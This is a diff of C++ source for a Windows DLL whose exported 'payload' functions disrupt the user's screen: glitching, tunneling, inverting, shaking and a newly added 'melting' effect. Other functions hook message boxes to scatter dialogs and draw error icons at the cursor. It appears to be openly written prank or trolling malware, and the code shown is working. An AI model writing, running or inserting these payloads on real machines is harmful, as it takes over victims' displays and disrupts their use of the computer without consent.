@@ -1,9 +1,15 @@
 #include <Windows.h>
 
+extern "C" {
+	int _fltused = 0;
+}
+
 #define PAYLOAD extern "C" __declspec(dllexport) void __stdcall
 #define ACTION PAYLOAD
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused);
+void updateHDC();
+
 LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
@@ -17,14 +23,32 @@ PAYLOAD payloadDrawErrors();
 PAYLOAD payloadInvertScreen();
 PAYLOAD payloadCursor(int power);
 PAYLOAD payloadEarthquake(int delay, int power);
+PAYLOAD payloadMeltingScreen(int size, int power);
 
 ACTION clearWindows();
 
 void strReverseW(LPWSTR str);
 int random();
+float sin(float x);
+
+HWND hwnd;
+HDC hdc;
+RECT rekt;
+int w, h;
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused) {
+	updateHDC();
+
 	return TRUE;
+}
+
+void updateHDC() {
+	hwnd = GetDesktopWindow();
+	hdc = GetWindowDC(hwnd);
+	GetWindowRect(hwnd, &rekt);
+
+	w = rekt.right - rekt.left;
+	h = rekt.bottom - rekt.top;
 }
 
 const char *sounds[] = {
@@ -46,8 +70,8 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
 			HWND hwnd = (HWND)wParam;
 
-			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
-			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);
+			int x = random() % (w - pcs->cx);
+			int y = random() % (h - pcs->cy);
 
 			pcs->x = x;
 			pcs->y = y;
@@ -79,37 +103,28 @@ PAYLOAD payloadSound() {
 }
 
 PAYLOAD payloadGlitch() {
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
+	updateHDC();
 
-	int x1 = random() % (rekt.right - 100);
-	int y1 = random() % (rekt.bottom - 100);
-	int x2 = random() % (rekt.right - 100);
-	int y2 = random() % (rekt.bottom - 100);
+	int x1 = random() % (w - 100);
+	int y1 = random() % (h - 100);
+	int x2 = random() % (w - 100);
+	int y2 = random() % (h - 100);
 	int width = random() % 600;
 	int height = random() % 600;
 
 	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
-	ReleaseDC(hwnd, hdc);
 }
 
 PAYLOAD payloadTunnel() {
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
+	updateHDC();
 	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
-	ReleaseDC(hwnd, hdc);
 }
 
 PAYLOAD payloadDrawErrors() {
+	updateHDC();
+
 	int ix = GetSystemMetrics(SM_CXICON) / 2;
 	int iy = GetSystemMetrics(SM_CYICON) / 2;
-
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
 
 	POINT cursor;
 	GetCursorPos(&cursor);
@@ -117,19 +132,13 @@ PAYLOAD payloadDrawErrors() {
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
 
 	if (random() % 4 == 0) {
-		DrawIcon(hdc, random() % GetSystemMetrics(SM_CXSCREEN), random() % GetSystemMetrics(SM_CYSCREEN), LoadIcon(NULL, IDI_WARNING));
+		DrawIcon(hdc, random() % w, random() % h, LoadIcon(NULL, IDI_WARNING));
 	}
-
-	ReleaseDC(hwnd, hdc);
 }
 
 PAYLOAD payloadInvertScreen() {
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
+	updateHDC();
 	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
-	ReleaseDC(hwnd, hdc);
 }
 
 PAYLOAD payloadCursor(int power) {
@@ -151,26 +160,51 @@ BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
-HBITMAP screenshot = NULL;
-HDC dc, dc2;
-int w, h;
-
 PAYLOAD payloadEarthquake(int delay, int power) {
-	if (screenshot == NULL) {
-		w = GetSystemMetrics(SM_CXSCREEN);
-		h = GetSystemMetrics(SM_CYSCREEN);
+	updateHDC();
 
-		dc = GetWindowDC(GetDesktopWindow());
+	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
+	HDC hdc2 = CreateCompatibleDC(hdc);
+	SelectObject(hdc2, screenshot);
 
-		screenshot = CreateCompatibleBitmap(dc, w, h);
-		dc2 = CreateCompatibleDC(dc);
-		SelectObject(dc2, screenshot);
+	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+	BitBlt(hdc, 0, 0, w, h, hdc2, (random() % power) - (power/2), (random() % power) - (power/2), SRCCOPY);
+	Sleep(delay*10);
+	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);
+
+	DeleteDC(hdc2);
+	DeleteObject(screenshot);
+}
+
+PAYLOAD payloadMeltingScreen(int size, int power) {
+	updateHDC();
+
+	HBITMAP screenshot = CreateCompatibleBitmap(hdc, size, rekt.bottom);
+	HDC hdc2 = CreateCompatibleDC(hdc);
+	SelectObject(hdc2, screenshot);
+
+	for (int i = 0; i < power; i++) {
+		int x = random() % (w - size);
+
+		BitBlt(hdc2, 0, 0, size, h, hdc, x, 0, SRCCOPY);
+
+		for (int j = 0; j < size; j++) {
+			BitBlt(hdc2, j, 0, 1, h, hdc2, j, -sin(j/((float)size)*3.14159)*(size/4), SRCCOPY);
+		}
+
+		BitBlt(hdc, x, 0, size, h, hdc2, 0, 0, SRCCOPY);
 	}
 
-	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
-	BitBlt(dc, 0, 0, w, h, dc2, (random() % power) - (power/2), (random() % power) - (power/2), SRCCOPY);
-	Sleep(delay*10);
-	BitBlt(dc, 0, 0, w, h, dc2, 0, 0, SRCCOPY);
+	DeleteDC(hdc2);
+	DeleteObject(screenshot);
+}
+
+float sin(float x) {
+	__asm {
+		fld x
+		fsin
+		//ret
+	}
 }
 
 void strReverseW(LPWSTR str) {
